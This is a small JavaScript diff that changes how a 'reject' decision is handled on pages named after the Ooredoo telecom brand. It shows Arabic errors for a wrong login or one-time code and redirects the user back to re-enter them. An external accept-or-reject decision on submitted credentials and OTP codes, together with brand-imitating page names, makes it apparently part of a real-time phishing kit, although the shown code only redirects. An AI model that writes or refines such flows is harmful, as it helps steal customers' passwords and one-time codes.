@@ -158,23 +158,15 @@
     }
 
     if (decision === 'reject') {
-      if (flow === 'otp') {
-        sessionStorage.setItem('otpError', 'الرمز غير صحيح أو غير صالح');
-        localStorage.removeItem(decisionKey);
-        sessionStorage.removeItem(decisionKey);
-        localStorage.setItem(flowKey, 'otp');
-        sessionStorage.setItem(flowKey, 'otp');
-        window.location.href = 'otp_ooredoo.html';
-        return;
-      }
-
       sessionStorage.setItem('loginError', 'اسم المستخدم أو كلمة المرور غير صحيح');
       localStorage.removeItem(decisionKey);
       sessionStorage.removeItem(decisionKey);
       localStorage.removeItem('requestId');
       sessionStorage.removeItem('safwa_order_id');
-      localStorage.setItem(flowKey, 'login');
-      sessionStorage.setItem(flowKey, 'login');
+      localStorage.removeItem(flowKey);
+      sessionStorage.removeItem(flowKey);
+      sessionStorage.setItem('ooredooFlow', 'login');
+      localStorage.setItem('ooredooFlow', 'login');
       window.location.href = 'login_ooredoo.html';
       return;
     }
